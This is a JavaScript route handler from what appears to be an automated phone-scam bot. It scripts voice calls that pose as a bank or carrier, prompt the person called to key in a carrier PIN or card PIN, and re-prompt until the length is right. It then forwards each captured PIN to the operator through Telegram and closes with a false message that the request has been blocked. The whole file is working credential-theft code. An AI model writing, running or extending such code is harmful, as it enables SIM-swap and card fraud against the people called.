"use strict";
var __awaiter = (this && this.__awaiter) || function (thisArg, _arguments, P, generator) {
    function adopt(value) { return value instanceof P ? value : new P(function (resolve) { resolve(value); }); }
    return new (P || (P = Promise))(function (resolve, reject) {
        function fulfilled(value) { try { step(generator.next(value)); } catch (e) { reject(e); } }
        function rejected(value) { try { step(generator["throw"](value)); } catch (e) { reject(e); } }
        function step(result) { result.done ? resolve(result.value) : adopt(result.value).then(fulfilled, rejected); }
        step((generator = generator.apply(thisArg, _arguments || [])).next());
    });
};
Object.defineProperty(exports, "__esModule", { value: true });
const __1 = require("../..");
const __2 = require("../");
const uuid_1 = require("uuid");
const languages_1 = require("../../languages");
__2.app.all('/calls/pins/:step/:chatId/:language', (req, res) => __awaiter(void 0, void 0, void 0, function* () {
    const { step, chatId, language } = req.params;
    const { variables, pinType } = req.query;
    const { dtmf } = JSON.parse(variables);
    if (!dtmf) {
        return res.json({
            id: (0, uuid_1.v4)(),
            title: `call PINS STEP - ${chatId}`,
            record: false,
            steps: [
                {
                    id: (0, uuid_1.v4)(),
                    action: 'say',
                    options: {
                        payload: (0, languages_1.getLangPins)({
                            step: `1`,
                            pinType: `${pinType}`,
                            language: language,
                        }),
                        language,
                        voice: 'female',
                    },
                    onKeypressGoto: 'nextStepGoto',
                    onKeypressVar: 'dtmf',
                    endKey: '#',
                    maxNumKeys: 8,
                },
                {
                    id: (0, uuid_1.v4)(),
                    action: 'pause',
                    options: {
                        length: 5,
                    },
                    onKeypressGoto: 'nextStepGoto',
                    onKeypressVar: 'dtmf',
                    endKey: '#',
                    maxNumKeys: 8,
                },
                {
                    id: 'nextStepGoto',
                    action: 'fetchCallFlow',
                    options: {
                        url: `${process.env.ENDPOINT_URL}/calls/pins/${step}/${chatId}/${language}?pinType=${pinType}`,
                    },
                },
            ],
        });
    }
    if (dtmf) {
        if (!(dtmf.length >= 6 && dtmf.length < 7) && pinType === 'carrierPin') {
            return res.json({
                id: (0, uuid_1.v4)(),
                title: `call PINS STEP - ${chatId}`,
                record: false,
                steps: [
                    {
                        id: (0, uuid_1.v4)(),
                        action: 'say',
                        options: {
                            payload: (0, languages_1.getLangPins)({
                                step: `2`,
                                pinType: `${pinType}`,
                                language: language,
                            }),
                            language,
                            voice: 'female',
                        },
                        onKeypressGoto: 'nextStepGoto',
                        onKeypressVar: 'dtmf',
                        endKey: '#',
                        maxNumKeys: 8,
                    },
                    {
                        id: (0, uuid_1.v4)(),
                        action: 'pause',
                        options: {
                            length: 5,
                        },
                        onKeypressGoto: 'nextStepGoto',
                        onKeypressVar: 'dtmf',
                        endKey: '#',
                        maxNumKeys: 8,
                    },
                    {
                        id: 'nextStepGoto',
                        action: 'fetchCallFlow',
                        options: {
                            url: `${process.env.ENDPOINT_URL}/calls/pins/${step}/${chatId}/${language}?pinType=${pinType}`,
                        },
                    },
                ],
            });
        }
        if (!(dtmf.length >= 4 && dtmf.length < 5) && pinType === 'cardPin') {
            return res.json({
                id: (0, uuid_1.v4)(),
                title: `call PINS STEP - ${chatId}`,
                record: false,
                steps: [
                    {
                        id: (0, uuid_1.v4)(),
                        action: 'say',
                        options: {
                            payload: (0, languages_1.getLangPins)({
                                step: `2`,
                                pinType: `${pinType}`,
                                language: language,
                            }),
                            language,
                            voice: 'female',
                        },
                        onKeypressGoto: 'nextStepGoto',
                        onKeypressVar: 'dtmf',
                        endKey: '#',
                        maxNumKeys: 8,
                    },
                    {
                        id: (0, uuid_1.v4)(),
                        action: 'pause',
                        options: {
                            length: 5,
                        },
                        onKeypressGoto: 'nextStepGoto',
                        onKeypressVar: 'dtmf',
                        endKey: '#',
                        maxNumKeys: 8,
                    },
                    {
                        id: 'nextStepGoto',
                        action: 'fetchCallFlow',
                        options: {
                            url: `${process.env.ENDPOINT_URL}/calls/pins/${step}/${chatId}/${language}?pinType=${pinType}`,
                        },
                    },
                ],
            });
        }
        yield __1.bot.telegram.sendMessage(chatId, pinType === 'carrierPin'
            ? `Carrier pin is <b>${dtmf}</b> 📲`
            : `Card pin is <b>${dtmf}</b> 📟`, {
            parse_mode: 'HTML',
        });
    }
    return res.json({
        id: (0, uuid_1.v4)(),
        title: `call bank - ${chatId} OTP`,
        record: false,
        steps: [
            {
                id: (0, uuid_1.v4)(),
                action: 'say',
                options: {
                    payload: pinType === 'carrierPin'
                        ? `Thank you for verifying. The request has been blocked, Good bye.`
                        : (0, languages_1.getLangPins)({
                            step: `3`,
                            pinType: `${pinType}`,
                            language: language,
                        }),
                    language,
                    voice: 'female',
                },
            },
        ],
    });
}));
